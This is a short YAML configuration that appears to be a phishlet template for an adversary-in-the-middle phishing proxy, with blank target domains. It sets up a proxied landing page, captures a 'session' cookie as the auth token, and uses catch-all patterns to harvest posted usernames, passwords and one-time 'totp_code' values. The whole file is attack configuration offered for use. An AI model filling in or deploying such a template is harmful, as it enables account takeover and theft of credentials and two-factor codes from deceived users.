min_ver: '3.0.0'
proxy_hosts:
  - {phish_sub: '', orig_sub: '', domain: '', session: true, is_landing: true}
auth_urls:
  - '/home'
auth_tokens:
  - domain: '.'
    keys: ['session']
    type: 'cookie'
    always: true
credentials:
  username:
    key: 'username'
    search: '(.*)'
    type: 'post'
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'
  custom:
    - key: 'totp_code'
      search: '(.*)'
      type: 'post'
login:
  domain: '.'
  path: '/'
